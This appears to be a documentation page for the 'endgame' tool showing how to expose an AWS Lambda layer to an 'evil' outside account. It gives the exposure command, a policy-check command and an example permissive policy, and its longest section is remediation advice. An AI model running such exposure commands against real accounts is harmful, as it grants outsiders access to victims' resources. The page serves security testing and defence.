# Lambda Layers

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service lambda-layer --name test-resource-exposure:1
```

* To view the contents of the Lambda layer policy, run the following:

```bash
export VICTIM_RESOURCE_ARN=arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure
export VERSION=3
aws lambda get-layer-version-policy \
    --layer-name $VICTIM_RESOURCE_ARN \
    --version-number $VERSION
```

* Observe that the output of the overly permissive Lambda Layer Policy resembles the example shown below.

## Example

Observe that the Evil principal's account ID (`999988887777`) is given `lambda:GetLayerVersion` access to the Lambda layer `arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1`.

```json
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"lambda:GetLayerVersion\",\"Resource\":\"arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":\"lambda:GetLayerVersion\",\"Resource\":\"arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1\"}]}",
    "RevisionId": ""
}
```

## Exploitation

```
TODO
```

## Remediation

* **Trusted Accounts Only**: Ensure that Lambda Layers are only shared with trusted accounts.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to Lambda Layers. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your Lambda Layers**: Tightly control access to the following IAM actions:
      - [lambda:AddLayerVersionPermission](https://docs.aws.amazon.com/lambda/latest/dg/API_AddLayerVersionPermission.html): _Grants permission to add permissions to the resource-based policy of a version of an AWS Lambda layer_
      - [lambda:GetLayerVersionPolicy](https://docs.aws.amazon.com/lambda/latest/dg/API_GetLayerVersionPolicy.html): _Grants permission to view the resource-based policy for a version of an AWS Lambda layer_
      - [lambda:ListFunctions](https://docs.aws.amazon.com/lambda/latest/dg/API_ListFunctions.html): _Grants permission to retrieve a list of AWS Lambda functions, with the version-specific configuration of each function_
      - [lambda:ListLayers](https://docs.aws.amazon.com/lambda/latest/dg/API_ListLayers.html): _Grants permission to retrieve a list of AWS Lambda layers, with details about the latest version of each layer_
      - [lambda:ListLayerVersions](https://docs.aws.amazon.com/lambda/latest/dg/API_ListLayerVersions.html): _Grants permission to retrieve a list of versions of an AWS Lambda layer_
      - [lambda:RemoveLayerVersionPermission](https://docs.aws.amazon.com/lambda/latest/dg/API_RemoveLayerVersionPermission.html): _Grants permission to remove a statement from the permissions policy for a version of an AWS Lambda layer_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## References

* [aws lambda add-layer-version-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-layer-version-permission.html)
* [aws lambda get-layer-version-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/get-layer-version-policy.html)
* [Access Analyzer support for AWS Lambda Functions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda)
